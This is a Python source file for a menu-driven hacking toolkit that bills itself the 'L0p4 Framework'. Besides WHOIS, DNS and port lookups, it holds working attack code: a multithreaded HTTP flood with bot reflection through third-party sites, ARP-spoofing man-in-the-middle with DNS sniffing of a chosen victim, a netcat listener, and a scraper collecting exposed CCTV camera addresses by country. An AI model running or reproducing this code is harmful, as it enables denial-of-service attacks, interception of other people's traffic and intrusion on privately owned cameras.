import os
import sys
import socket
import requests
import whois
from scapy.all import sniff, ARP, send, DNSQR, IP
import dns.resolver
import time
import random
from queue import Queue
import getpass
import urllib.request
import logging
import subprocess
import threading
import json
import re
import ipaddress
import colorama
from colorama import Fore, Style

import requests, re , colorama ,random
from requests.structures import CaseInsensitiveDict

username = getpass.getuser()
colorama.init()

title = f"""{Fore.CYAN}
    __    ____        __ __     _____                                              __  
   / /   / __ \\____  / // /    / ____/________ _____ ___  ___ _      ______  _____/ /__
  / /   / / / / __ \\/ // /_   / /_  / ___/ __ `/ __ `__ \\/ _ \\ | /| / / __ \\/ ___/ //_/
 / /___/ /_/ / /_/ /__  __/  / __/ / /  / /_/ / / / / / /  __/ |/ |/ / /_/ / /  / ,<   
/_____/\\____/ .___/  /_/    /_/   /_/   \\__,_/_/ /_/ /_/\\___/|__/|__/\\____/_/  /_/|_|  
           /_/                                                                         
{Style.RESET_ALL}"""

def text_animation(text, ms):
    for word in text:
        print(word, end='', flush=True)
        time.sleep(ms)



def ask_next_action(current_tool_func, back_to_menu_func, prev_func):
    print(f"\n{Fore.YELLOW} [1] Repeat\n [2] {prev_func}\n [3] Main Menu{Style.RESET_ALL}")
    choice = input(f"{Fore.GREEN}root@{username}:~$ {Style.RESET_ALL}")
    if choice == "1":
        current_tool_func()
    elif choice == "2":
        os.system("clear")
        text_animation(title, 0.001)
        back_to_menu_func()
    elif choice == "3":
        main()
    else:
        print(f"{Fore.RED}Invalid input. Returning to main menu.{Style.RESET_ALL}")
        main()



def whois_lookup():
    domain = input(f"{Fore.YELLOW}Target domain (e.g. example.com): {Style.RESET_ALL}")
    try:
        w = whois.whois(domain)
        print(f"{Fore.GREEN}{w}{Style.RESET_ALL}")
    except Exception as e:
        print(f"{Fore.RED}WHOIS error: {e}{Style.RESET_ALL}")
    ask_next_action(whois_lookup, information_gathering, "Information Gathering")



def dns_lookup():
    domain = input(f"{Fore.YELLOW}Target domain (e.g. example.com): {Style.RESET_ALL}")
    try:
        result = dns.resolver.resolve(domain, 'A')
        for ip in result:
            print(f"{Fore.GREEN}[+] IP: {ip}{Style.RESET_ALL}")
    except Exception as e:
        print(f"{Fore.RED}DNS error: {e}{Style.RESET_ALL}")
    ask_next_action(dns_lookup, information_gathering, "Information Gathering")



def load_wordlist(file_path):
    """Load keywords from the wordlist file."""
    try:
        with open(file_path, 'r') as file:
            wordlist = [line.strip() for line in file if line.strip()]
        if wordlist:
            print(f"{Fore.GREEN}[+] Loaded {len(wordlist)} subdomain keywords from {file_path}{Style.RESET_ALL}")
            return wordlist
        else:
            print(f"{Fore.RED}[-] The wordlist file is empty.{Style.RESET_ALL}")
            return []
    except FileNotFoundError:
        print(f"{Fore.RED}[-] Wordlist file not found: {file_path}{Style.RESET_ALL}")
        return []



def subdomain_scanner():
    domain = input(f"{Fore.YELLOW}Target domain (e.g. example.com): {Style.RESET_ALL}")
    wordlist = load_wordlist("small.txt")

    if not wordlist:
        print(f"{Fore.RED}Aborting scan: no subdomains loaded.{Style.RESET_ALL}")
        ask_next_action(subdomain_scanner, information_gathering, "Information Gathering")
        return

    print(f"\n{Fore.YELLOW}[*] Scanning subdomains...{Style.RESET_ALL}")
    for sub in wordlist:
        url = f"{sub}.{domain}"
        try:
            socket.gethostbyname(url)
            print(f"{Fore.GREEN}[+] Found: {url}{Style.RESET_ALL}")
        except socket.gaierror:
            continue
    ask_next_action(subdomain_scanner, information_gathering, "Information Gathering")




def port_scanner():
    target = input(f"{Fore.YELLOW}Target IP or domain: {Style.RESET_ALL}")
    ports = [21, 22, 23, 25, 53, 80, 110, 139, 143, 443, 445, 8080]
    print(f"{Fore.YELLOW}[*] Scanning ports...{Style.RESET_ALL}")
    for port in ports:
        s = socket.socket()
        s.settimeout(1)
        try:
            s.connect((target, port))
            print(f"{Fore.GREEN}[+] Port {port} is OPEN{Style.RESET_ALL}")
        except:
            pass
        s.close()
    ask_next_action(port_scanner, information_gathering, "Information Gathering")



def information_gathering():
    print(f"\n{Fore.CYAN}--- Information Gathering ---{Style.RESET_ALL}")
    print(" [1] WHOIS Lookup")
    print(" [2] DNS Lookup")
    print(" [3] Subdomain Scanner")
    print(" [4] Port Scanner\n")
    print(" [0] Menu\n")

    choice = input(f"{Fore.GREEN}root@{username}/info:~$ {Style.RESET_ALL}")

    match choice:
        case "1":
            text_animation(f"{Fore.CYAN}\n[+] Executing WHOIS Lookup...\n{Style.RESET_ALL}", 0.02)
            whois_lookup()
        case "2":
            text_animation(f"{Fore.CYAN}\n[+] Executing DNS Lookup...\n{Style.RESET_ALL}", 0.02)
            dns_lookup()
        case "3":
            text_animation(f"{Fore.CYAN}\n[+] Executing Subdomain Scan...\n{Style.RESET_ALL}", 0.02)
            subdomain_scanner()
        case "4":
            text_animation(f"{Fore.CYAN}\n[+] Executing Port Scan...\n{Style.RESET_ALL}", 0.02)
            port_scanner()
        case "0":
            main()
        case _:
            print(f"{Fore.RED}Invalid input.{Style.RESET_ALL}")
            information_gathering()




def web_scanner():
    text_animation(f"{Fore.RED}Coming Soon...{Style.RESET_ALL}", 0.01)
    time.sleep(1)
    main()


def exploitation():
    pass


def remote_access():
    text_animation(f"{Fore.RED}Coming Soon...{Style.RESET_ALL}", 0.01)
    time.sleep(1)
    main()


def wireless_tools():
    text_animation(f"{Fore.RED}Coming Soon...{Style.RESET_ALL}", 0.01)
    time.sleep(1)
    main()


################################# DOS ATTACK ##############################################

def dos():
    os.system("clear")
    text_animation(title, 0.002)

    def load_user_agents():
        global uagent
        uagent = [
            "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.0) Opera 12.14",
            "Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:26.0) Gecko/20100101 Firefox/26.0",
            "Mozilla/5.0 (X11; Linux x86_64; rv:1.9.1.3) Gecko/20090913 Firefox/3.5.3",
            "Mozilla/5.0 (Windows; Windows NT 6.1; en; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)",
            "Mozilla/5.0 (Windows NT 6.2) AppleWebKit/535.7 (KHTML, like Gecko) Comodo_Dragon/16.1.1.0 Chrome/16.0.912.63 Safari/535.7",
            "Mozilla/5.0 (Windows; Windows NT 5.2; en-US; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)",
            "Mozilla/5.0 (Windows; Windows NT 6.1; en-US; rv:1.9.1.1) Gecko/20090718 Firefox/3.5.1"
        ]

    def load_bots():
        global bots
        bots = [
            "http://validator.w3.org/check?uri=",
            "http://www.facebook.com/sharer/sharer.php?u="
        ]

    def bot_attack(url):
        try:
            while True:
                req = urllib.request.Request(url, headers={'User-Agent': random.choice(uagent)})
                urllib.request.urlopen(req)
                print("\033[94m [Bot] Sending indirect attack request...\033[0m")
                time.sleep(0.1)
        except:
            time.sleep(0.1)

    def direct_attack(item):
        try:
            while True:
                packet = str(f"GET / HTTP/1.1\nHost: {host}\n\nUser-Agent: {random.choice(uagent)}\n{data}").encode('utf-8')
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.connect((host, int(port)))
                if s.sendto(packet, (host, int(port))):
                    s.shutdown(socket.SHUT_WR)
                    print(f"\033[92m[{time.ctime()}] Packet sent successfully\033[0m \033[94m<-- HaxL0p4 packet -->\033[0m")
                else:
                    print("\033[91m Connection closed unexpectedly\033[0m")
                time.sleep(0.1)
        except socket.error:
            print("\033[91m [!] Connection error! Target may be down.\033[0m")
            time.sleep(0.1)

    def attack_thread():
        while True:
            item = q.get()
            direct_attack(item)
            q.task_done()

    def bot_thread():
        while True:
            item = w.get()
            bot_attack(random.choice(bots) + "http://" + host)
            w.task_done()

    def get_user_input():
        global host, port, threads

        host = input(f"\nEnter target host {Fore.CYAN}> {Style.RESET_ALL}")
        port = input(f"Enter target port (default 80) {Fore.CYAN}> {Style.RESET_ALL}") or "80"
        threads = input(f"Enter number of threads (default 135) {Fore.CYAN}> {Style.RESET_ALL}") or "135"

        print(f"\n\033[92mTarget: {host} | Port: {port} | Threads: {threads}\033[0m")
        text_animation("\033[94mPreparing attack...\033[0m\n", 0.03)

    # Queues for threading
    q = Queue()
    w = Queue()

    # Read headers
    with open("headers.txt", "r") as headers:
        global data
        data = headers.read()

    get_user_input()
    load_user_agents()
    load_bots()

    # Test connection
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((host, int(port)))
        s.settimeout(1)
    except socket.error:
        print("\033[91m [!] Could not connect to the target. Check host/port.\033[0m")
        sys.exit()

    # Start threads
    for _ in range(int(threads)):
        t = threading.Thread(target=attack_thread)
        t.daemon = True
        t.start()
        t2 = threading.Thread(target=bot_thread)
        t2.daemon = True
        t2.start()

    # Task queue
    item = 0
    while True:
        if item > 1800:
            item = 0
            time.sleep(0.1)
        item += 1
        q.put(item)
        w.put(item)

    q.join()
    w.join()

########################################## END DOS ATTACK ###################################################

def netcat_listener():
    os.system("clear")
    text_animation(title, 0.001)
    port = input(f"\n{Fore.YELLOW}Port: {Style.RESET_ALL}")
    text_animation(f"\n{Fore.YELLOW}CTRL+C for return to menu...{Style.RESET_ALL}\n", 0.02)
    try:
        subprocess.run(["nc", "-lvp", port])
    except KeyboardInterrupt:
        text_animation(f"\n {Fore.RED}[!] Connection Closed... Return to main menu...{Style.RESET_ALL}", 0.02)
        time.sleep(1)
        main()


def network():
    print(f"\n{Fore.CYAN}--- Network ---{Style.RESET_ALL}")
    print(" [1] Network Scanner")
    print(" [2] Port Scanner")
    print(" [3] Web Spy")
    print(" [4] Netcat Listener")
    print(" [5] Evil Portal")
    print(" [6] CCTV Cam's\n")
    print(" [0] Return To Menu\n")
    choice = input(f"{Fore.GREEN}root@{username}/network:~$ {Style.RESET_ALL}")

    match (choice):
        case "1":
            net_scan()
        case "2":
            port_scanner()
        case "3":
            web_spoof()
        case "4":
            netcat_listener()
        case "0":
            main()



def net_scan():
    text_animation(f"\n{Fore.RED}[*] Scanning local network using ARP...{Style.RESET_ALL}", 0.02)
    print("\n")
    os.system("sudo arp-scan -l")
    
    ask_next_action(net_scan, network, "Network")   


def enable_promiscuous(iface):
    os.system(f"sudo ip link set {iface} promisc on")


def arp_spoof(victim_ip, gateway_ip, iface):
    pkt_to_victim = ARP(op=2, pdst=victim_ip, psrc=gateway_ip)
    pkt_to_gateway = ARP(op=2, pdst=gateway_ip, psrc=victim_ip)
    print(f"{Fore.CYAN}[*] Starting ARP spoofing (MITM)...{Style.RESET_ALL}")
    try:
        while True:
            send(pkt_to_victim, iface=iface, verbose=False)
            send(pkt_to_gateway, iface=iface, verbose=False)
            time.sleep(2)
    except KeyboardInterrupt:
        print(f"\n{Fore.RED}[!] ARP spoofing stopped.{Style.RESET_ALL}")

def dns_sniffer(iface, target_ip=""):
    def process_packet(packet):
        if packet.haslayer(DNSQR) and packet.haslayer(IP):
            if not target_ip or packet[IP].src == target_ip:
                try:
                    domain = packet[DNSQR].qname.decode('utf-8')
                    print(f"{Fore.GREEN}[+] {packet[IP].src} requested: {domain}{Style.RESET_ALL}")
                except Exception as e:
                    print(f"{Fore.RED}[-] Error decoding DNS request: {e}{Style.RESET_ALL}")
    sniff(filter="udp port 53", iface=iface, prn=process_packet, store=False)




def web_spoof():
    iface = input(f"{Fore.YELLOW}Interface (e.g., wlan0): {Style.RESET_ALL}")
    victim_ip = input(f"{Fore.YELLOW}Victim IP > {Style.RESET_ALL}")
    gateway_ip = input(f"{Fore.YELLOW}Gateway IP > {Style.RESET_ALL}")

    # 1. Abilita promiscua
    enable_promiscuous(iface)

    # 2. Abilita IP forwarding
    os.system("sudo sysctl -w net.ipv4.ip_forward=1")

    # 3. IPTABLES NAT
    os.system(f"sudo iptables -t nat -A POSTROUTING -o {iface} -j MASQUERADE")

    # 4. Avvia ARP spoof in background
    spoof_thread = threading.Thread(target=arp_spoof, args=(victim_ip, gateway_ip, iface), daemon=True)
    spoof_thread.start()

    # 5. Sniffing
    print(f"{Fore.CYAN}\n[*] Sniffing DNS traffic from {victim_ip} on {iface}... Press Ctrl+C to stop.{Style.RESET_ALL}")
    try:
        dns_sniffer(iface, victim_ip)
    except KeyboardInterrupt:
        print(f"\n{Fore.RED}[!] Sniffing stopped.{Style.RESET_ALL}")



def get_public_ip():
    r = requests.get("https://api.ipify.org")
    return r.text


def ip_geo():
    os.system("clear")
    text_animation(title, 0.002)

    public_ip = get_public_ip()
    print(f"\n Your ip address: {Fore.RED}{public_ip}{Style.RESET_ALL}")
    print(f'\n Type "{Fore.RED}0{Style.RESET_ALL}" for return back')

    target_ip = input(f"{Fore.RED} TARGET IP: {Style.RESET_ALL}")

    if target_ip == "0":
        main()
    
    request_url = 'https://geolocation-db.com/jsonp/' + target_ip
    response = requests.get(request_url)
    result = response.content.decode()
    result = result.split("(")[1].strip(")")
    result = json.loads(result)

    print("\n Geolocation Information:")
    print(f" Country Code: {Fore.YELLOW}{result['country_code']}{Style.RESET_ALL}")
    print(f" Country Name: {Fore.YELLOW}{result['country_name']}{Style.RESET_ALL}")
    print(f" City: {Fore.YELLOW}{result['city']}{Style.RESET_ALL}")
    print(f" Postal Code: {Fore.RED}{result['postal']}{Style.RESET_ALL}")
    print(f" Latitude: {Fore.CYAN}{result['latitude']}{Style.RESET_ALL}")
    print(f" Longitude: {Fore.CYAN}{result['longitude']}{Style.RESET_ALL}")
    print(f" IPv4 Address: {Fore.GREEN}{result['IPv4']}{Style.RESET_ALL}")
    print(f" State: {Fore.GREEN}{result['state']}{Style.RESET_ALL}")

    back = input(f"\n{Fore.RED} [❔] Back Y/N: {Style.RESET_ALL}")

    if back.lower() == "y":
        main()
    elif back.lower() == "n":
        sys.exit()
    else:
        print("Option Not Valid...")


def CCTV():


    url = "http://www.insecam.org/en/jsoncountries/"

    headers = CaseInsensitiveDict()
    headers["Accept"] = "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7"
    headers["Cache-Control"] = "max-age=0"
    headers["Connection"] = "keep-alive"
    headers["Host"] = "www.insecam.org"
    headers["Upgrade-Insecure-Requests"] = "1"
    headers["User-Agent"] = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36"


    resp = requests.get(url, headers=headers)

    data = resp.json()
    countries = data['countries']


    for key, value in countries.items():
        print(f'Code : ({key}) - {value["country"]} / ({value["count"]})  ')
        print("")


    try:
    

        country = input("Code(##) : ")
        res = requests.get(
            f"http://www.insecam.org/en/bycountry/{country}", headers=headers
        )
        last_page = re.findall(r'pagenavigator\("\?page=", (\d+)', res.text)[0]

        for page in range(int(last_page)):
            res = requests.get(
                f"http://www.insecam.org/en/bycountry/{country}/?page={page}",
                headers=headers
            )
            find_ip = re.findall(r"http://\d+.\d+.\d+.\d+:\d+", res.text)

            with open(f'{country}.txt', 'w') as f:
              for ip in find_ip:
                  print("")
                  print("\033[1;31m", ip)
                  f.write(f'{ip}\n')
    except:
        pass
    finally:
        print("\033[1;37m")
        print('\033[37mSave File :'+country+'.txt')

        exit()


def main():
    os.system("clear")
    text_animation(title, 0.001)
    print(f"{Fore.CYAN}\n [1] Information Gathering\n [2] Web Hacking\n [3] Network\n [4] Remote Access\n [5] Wireless Tools\n [6] DoS Attack\n [7] Ip Geolocation\n [8] CCTV Cam's\n\n{Style.RESET_ALL} {Fore.RED}[0] Exit{Style.RESET_ALL}\n")
    s = input(f"{Fore.GREEN}root@{username}:~$ {Style.RESET_ALL}")

    match s:
        case "1":
            information_gathering()
        case "2":
            web_scanner()
            # coming soon
        case "3":
            network()
        case "4":
            remote_access()
            # coming soon
        case "5":
            wireless_tools()
            # coming soon
        case "6":
            dos()
        case "7":
            ip_geo()
        case "8":
            CCTV()
        case "0":
            sys.exit()
        case _:
            print(f"{Fore.RED}Invalid input.{Style.RESET_ALL}")
            main()



if __name__ == '__main__':
    main()